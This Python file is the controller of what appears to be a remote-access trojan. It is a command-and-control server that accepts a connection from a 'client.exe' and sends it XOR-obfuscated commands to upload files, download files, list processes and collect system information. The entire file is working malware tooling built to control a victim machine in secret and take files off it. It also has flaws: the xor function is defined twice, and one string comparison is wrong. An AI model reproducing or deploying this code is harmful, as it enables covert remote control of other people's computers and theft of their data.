import socket, os

HOST = '127.0.0.1'
PORT = 25565

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #establishing sockets
sock.bind((HOST, PORT))
sock.listen(1)

options = """ 

Commands:

help
    displays this help window

end
    ends the session for the client, server stays running

upload
    uploads a file from the server to the client
    file automatically will transfer into the directory that client.exe runs from
      - syntax: upload <client/file/path> <local/file/path>
      
download
    downloads a file from the client to the server
    file automatically will transfer into the directory that server.py runs from
      - syntax: download <client/file/path> <local/file/path>
    
processes
    lists PIDs and process names of all processes running on client
      - syntax: processes <outfile>
        note: <outfile> argument NOT required
    
systeminfo
    lists generic system info of client machine
      - syntax: systeminfo <outfile>
        note: <outfile> argument NOT required
    
"""

OPTIONS = ["upload", "download", "systeminfo", "processes", "help", "end"] #available commands

def xor(msg):
    xor_key = ord('+') # XOR key as ASCII value of '+'
    msg_len = len(msg)
    xor_msg = '' # init empty string
    for i in range(msg_len):
        if msg[i] != '\0' and msg[i] != chr(xor_key):
            xor_msg += chr(ord(msg[i]) ^ xor_key) # XOR each character with the XOR key, excluding special characters
        else:
            xor_msg += msg[i] # Add character as is if it's a special character
    return str.encode(xor_msg) # return XOR'd character string in bytes

def xor(msg):
    newMsg = "" 
    for char in msg:
        if char is '+':
            newMsg += str(char)
        else:
            decrChar = ord(str(char)) ^ ord('+') # compute xor for ascii value of char and +
            newMsg += str(chr(decrChar)) # append to new newMessage
    return str.encode(newMsg) # return result in bytes

def receiveMsg(conn, filename=None):  # receive a variable length message and print it, if given 
    recv = conn.recv(8).decode()  # recieve incoming message length (up to 8 hex digits)
    print(f"message length encoded: {recv}")  # print decoded recieved data
    msg = xor(recv)  # decode the message received
    # turn message length into hex (message may be padded with 'P') 
    msgLen = int(msg, 16)  # turn msgLen into hex int
    print(f"message length (base 10): {msgLen}")
    if filename is None:
        print("message decoded:\n")
        while msgLen > 0: # when message length is less than 0, stop recieving
            if msgLen < 1024:  # if message length is less than 1024, only recieve the rest of the message
                recv = conn.recv(msgLen).decode()
                msg = xor(recv)
            else:  # otherwise recieve 1024 bytes at a time
                recv = conn.recv(1024).decode()  # receive 1024 bytes
                msg = xor(recv)  # xor decode 1024 bytes
            print(f"{msg.decode()}", end="")
            msgLen -= 1024  # decrement message length
    else:  # if filepath is included: write output to file
        if msgLen == 1:
            print(f"Client error creating file: {filename}")
        else:
            with open(filename, 'wb') as file:
                while msgLen > 0: # when message length is less than 0, stop recieving
                    if msgLen < 1024:  # if message length is less than 1024, only recieve the rest of the message
                        recv = conn.recv(msgLen).decode()
                        msg = xor(recv)
                        file.write(msg)
                    else:  # otherwise recieve 1024 bytes at a time
                        recv = conn.recv(1024).decode()  # receive 1024 bytes
                        msg = xor(recv)  # xor decode 1024 bytes
                        file.write(msg)
                        
                    msgLen -= 1024  # decrement message length
                print(f"File {filename} received successfully")
        
def main():
    while True: 
        print("Accepting...")
        conn, addr = sock.accept() # Accept incoming connection and get client's address
        print ('Connection from ' + str(addr))
        print(options)

        while True: #beggining of accepting input
            userInput = input(">> ")
            command = userInput.split(' ')
            if command[0] not in OPTIONS: #validate user input
                print(f"\n'{command[0]}' is not a valid command.\n")
            elif command[0].lower() == "end": # if input is end close connection
                conn.sendall(xor("end")) # send encrypted end to client
                conn.shutdown(socket.SHUT_RDWR) #shutdown socket for reading and writing
                conn.close()
                break            
            elif command[0].lower() == "upload":
                # syntax: upload client/file/path local/file/path
                # file will go to client's  current working directory
                if len(command) != 3: #check if number args provided is correct
                    print("Incorrect upload syntax.\nCORRECT SYNTAX: upload <client/file/path> <local/file/path>")
                    continue

                userInput = xor(command[0].lower()) #encrpyt user input commmand
                conn.send(userInput) #send encrypted command to client
                
                userInput = xor(command[1]) # encrypt client/file/path
                conn.send(userInput) # send name of file desired for download
                
                receiveMsg(conn)

                sourcePath = command.pop(1) #get src file path from user input
                print(f"Writing file to {sourcePath} on client machine\n")
                
                msgLen = os.path.getsize(sourcePath)
                hMsgLen = hex(msgLen)[2:]
                print(f"hMsgLen: {hMsgLen}")
                conn.send(xor(hMsgLen))
                
                offset = 0
                with open(sourcePath, 'rb') as file:
                    while offset < msgLen:
                        chunk = file.read(1024)
                        conn.sendall(xor(chunk.decode()))
                        offset += len(chunk)
                        
                receiveMsg(conn)
            
            elif command[0].lower() == "download" :
                # syntax: download client/file/path local/file/path
                # file will go to server's current working directory

                if len(command) != 3: #check if number args provided is correct
                    print("Incorrect download syntax.\nCORRECT SYNTAX: download <client/file/path> <local/file/path>")
                    continue
                
                userInput = xor(command[0].lower()) # encrpyt commmand
                conn.sendall(userInput) # send xor'd command
                
                userInput = xor(command[1]) # encrypt filepath
                conn.sendall(userInput) # send xor'd filepath
                
                destPath = command.pop(1)
                print(f"Writing file to {destPath}\n")
                receiveMsg(conn, destPath)
                
            elif command[0].lower() == "systeminfo" or command[0].lower() == "processes":  # processes and systeminfo use the same receive function
                userInput = xor(command[0].lower())  # encrpyt commmand
                conn.sendall(userInput)  # send xor'd command
                if len(command) == 2:
                    print(f"Writing {command[0].lower()} to {command[1]}\n")
                    destPath = command.pop(1)
                    receiveMsg(conn, destPath)
                else:
                    receiveMsg(conn)
                    
            elif "help" in command[0].lower():
                print(options)
            
if __name__ == "__main__":
    main()